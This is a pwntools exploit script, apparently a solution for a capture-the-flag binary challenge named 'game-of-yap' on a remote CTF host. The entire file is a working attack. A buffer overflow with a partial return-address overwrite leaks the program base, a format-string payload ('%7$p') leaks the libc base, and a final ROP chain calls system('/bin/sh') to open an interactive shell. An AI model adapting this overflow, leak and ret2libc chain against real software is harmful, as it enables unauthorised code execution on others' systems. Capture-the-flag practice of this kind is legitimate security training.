from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./game-of-yap"
libc_path = "./libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    io = process([vuln_path])
    # io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("yap.chal.cyberjousting.com", 1355)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))


payload = b"t"*0x100 + p64(0) + b"\x80"
io.sendafter("Here's your first chance...\n", payload)
play_address = int(io.recvuntil("\n", drop=True), 16)
elf.address = play_address - 0x1210
log.success(hex(play_address))
log.success(hex(elf.address))


# 第二次进程序
"""
0x0000000000001243 : mov rdi, rsi ; ret
0x00000000000011b3 : pop rbp ; ret
0x000000000010f75b : pop rdi ; ret
"""
payload = b"%7$p".ljust(0x100, b"t")
#payload = b"%11$p--%12$p--\x00".ljust(0x100, b"t")
payload += p64(0)
payload += p64(elf.address + 0x1243)
# payload += p64(elf.address + 0x1294)
payload += p64(elf.plt.get("printf"))
payload += p64(elf.address + 0x1214)

ddebug("breakeva 0x1294\ncontinue")
io.sendafter("One more try...\n", payload)
libc.address = int(io.recvuntil(b"tttt", drop=True), 16) - 0x2a1ca
log.success(hex(libc.address))


payload = b"tinyfat".ljust(0x100, b"t")
payload += p64(0)
payload += p64(libc.address + 0x000000000010f75b)
payload += p64(next(libc.search("/bin/sh")))
payload += p64(libc.symbols["system"])
io.sendline(payload)

io.interactive()

